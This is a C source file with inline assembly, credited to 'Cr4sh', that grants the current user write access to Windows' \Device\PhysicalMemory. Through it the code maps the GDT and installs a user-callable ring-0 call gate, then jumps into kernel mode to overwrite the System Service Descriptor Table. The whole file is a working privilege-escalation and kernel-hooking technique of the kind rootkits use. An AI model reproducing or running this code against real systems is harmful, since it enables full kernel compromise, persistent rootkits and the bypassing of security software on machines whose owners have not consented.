// (c) Cr4sh

#define INTNUMBER				0FFh
#define SE_KERNEL_OBJECT		6
#define OBJ_KERNEL_HANDLE		0x00000200L

#define INIT_UNICODE(_var,_buffer)            \
        UNICODE_STRING _var = {               \
            sizeof (_buffer) - sizeof (WORD), \
            sizeof (_buffer),                 \
			_buffer }

#define MAKE_DWORD(_l, _h) (DWORD) (_l | (_h << 16))

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

typedef struct _KGDTENTRY 
{
   WORD LimitLow;
   WORD BaseLow;
   WORD BaseHigh;
} KGDTENTRY, 
*PKGDTENTRY;

typedef struct _CALLGATE_DESCRIPTOR 
{
   USHORT offset_0_15;
   USHORT selector;
   UCHAR  param_count :4;
   UCHAR  some_bits   :4;
   UCHAR  type        :4;
   UCHAR  app_system  :1;
   UCHAR  dpl         :2;
   UCHAR  present     :1;
   USHORT offset_16_31;
} CALLGATE_DESCRIPTOR, 
*PCALLGATE_DESCRIPTOR;



extern DWORD sstaddr;
extern DWORD dwServices;
DWORD sst[400];
//--------------------------------------------------------------------------------------
void __declspec(naked) R0Func(void) 
{
	UINT i;
	__asm 
	{
		cli
		pushad
		pushf
		mov		di,0x30
		mov		fs,di
	}

	for (i = 0; i < dwServices; i++)
		((DWORD*)(*(DWORD*)(sstaddr)))[i] = sst[i];

	__asm
	{
		mov		di,0x3B
		mov		fs,di
		popf
		popad
		sti
		retf
	}
}
//--------------------------------------------------------------------------------------
/*
DWORD FindFunc(char *name)
{
	HMODULE hKrnl = LoadLibraryEx("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (hKrnl == NULL)
		return 0;

	DWORD dwAddr = (DWORD)GetProcAddress(hKrnl, name);
	if (dwAddr == 0)
		return 0;

	return dwAddr - (DWORD)hKrnl + dwKernelBase;
}
*/
//--------------------------------------------------------------------------------------
PHYSICAL_ADDRESS GetPhysicalAddress(ULONG vAddress) 
{
	PHYSICAL_ADDRESS  addr;

    if (vAddress < 0x80000000L || vAddress >= 0xA0000000L) 
	{
		addr.QuadPart = (ULONGLONG) vAddress & 0xFFFF000;
	} else {
		addr.QuadPart = (ULONGLONG) vAddress & 0x1FFFF000;
	}
   
	return addr;
}
//--------------------------------------------------------------------------------------
void SetAccess(POBJECT_ATTRIBUTES ObAttributes)
{
	EXPLICIT_ACCESS Access;
	HANDLE hObj;
	PACL OldDacl = NULL, NewDacl = NULL;
	PSECURITY_DESCRIPTOR SecDesc = NULL;
	NTSTATUS ns;
	
	Access.grfAccessPermissions				= SECTION_MAP_WRITE;
	Access.grfAccessMode					= GRANT_ACCESS;
	Access.grfInheritance					= NO_INHERITANCE;
	Access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
	Access.Trustee.pMultipleTrustee			= NULL;
	Access.Trustee.TrusteeForm				= TRUSTEE_IS_NAME;
	Access.Trustee.TrusteeType				= TRUSTEE_IS_USER;
	Access.Trustee.ptstrName				= "CURRENT_USER";

	ns = NtOpenSection(&hObj, MEM_MAPPED | MEM_PRIVATE, ObAttributes);
	
	ns = GetSecurityInfo(hObj, (SE_OBJECT_TYPE)SE_KERNEL_OBJECT, 
		DACL_SECURITY_INFORMATION, 0, 0, &OldDacl, 0, &SecDesc);
   	
	ns = SetEntriesInAcl(1, &Access, OldDacl, &NewDacl);
	
	ns = SetSecurityInfo(hObj, (SE_OBJECT_TYPE)SE_KERNEL_OBJECT, 
		DACL_SECURITY_INFORMATION, NULL, NULL, NewDacl, NULL);

	CloseHandle(hObj);
}
//--------------------------------------------------------------------------------------
KGDTENTRY gGdt;
BOOL CallR0(DWORD Func)
{
	BOOL bRes = FALSE;
	OBJECT_ATTRIBUTES ObAttributes;
	HANDLE hSection;
	NTSTATUS ns;
	PHYSICAL_ADDRESS pAddress;
	PVOID MappedAddress = NULL;
	DWORD dwSize;
	PCALLGATE_DESCRIPTOR CgDesc;
	WORD farcall[3];
	INIT_UNICODE(ObString, L"\\Device\\PhysicalMemory");
	InitializeObjectAttributes(&ObAttributes, &ObString, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	
	SetAccess(&ObAttributes);

	ns = NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, &ObAttributes); 
	if (!NT_SUCCESS(ns)) 
	{
	//	printf("[!] NtOpenSection ERROR: %x\n", ns);
		return FALSE;
	}


	__asm sgdt gGdt;
///
//	printf("virtual address of GDT : 0x%.8x\n", MAKE_DWORD(gGdt.BaseLow, gGdt.BaseHigh));
	
	pAddress = GetPhysicalAddress(MAKE_DWORD(gGdt.BaseLow, gGdt.BaseHigh));
	
//	printf("physical address of GDT: 0x%.16x\n", pAddress.QuadPart);

	dwSize = gGdt.LimitLow;
	ns = NtMapViewOfSection(hSection, (HANDLE)-1, &MappedAddress,
                            0L, dwSize, &pAddress, &dwSize, ViewShare,
                            0, PAGE_READWRITE);
	if (!NT_SUCCESS(ns) || !MappedAddress) 
	{
	//	printf("[!] NtMapViewOfSection ERROR: %x\n", ns);
		goto end;
	}

	for (CgDesc = (PCALLGATE_DESCRIPTOR)((DWORD)MappedAddress + (gGdt.LimitLow & 0xFFF8));
		(DWORD)CgDesc > (DWORD)MappedAddress;
		CgDesc--) 
	{      
		//printf("present:%x, type:%x\n", CgDesc->present, CgDesc->type);

		if (CgDesc->present == 0)
		{		
			CgDesc->offset_0_15  = (WORD)(Func & 0xFFFF);
			CgDesc->selector     = 8;
			CgDesc->param_count  = 0;
			CgDesc->some_bits    = 0;
			CgDesc->type         = 12;
			CgDesc->app_system   = 0;
			CgDesc->dpl          = 3;
			CgDesc->present      = 1;
			CgDesc->offset_16_31 = (WORD)(Func >> 16);			
			bRes = TRUE;
			break;
		}
	}

	if (bRes)
	{

		farcall[2] = ((WORD)((DWORD)CgDesc - (DWORD)MappedAddress))|3;
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
		Sleep(0);

		__try 
		{
			__asm call fword ptr [farcall]
		}
		__except (EXCEPTION_EXECUTE_HANDLER) 
		{
			// printf("EXEPTION\n");
			bRes = FALSE;
		}

		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

		fZeroMemory(CgDesc, sizeof(CALLGATE_DESCRIPTOR));
	}

end:
	NtUnmapViewOfSection((HANDLE)-1, MappedAddress);

	CloseHandle(hSection);

	return bRes;
}
//--------------------------------------------------------------------------------------
//int _tmain(int argc, _TCHAR* argv[])
//{
	// printf("end\n");
//}
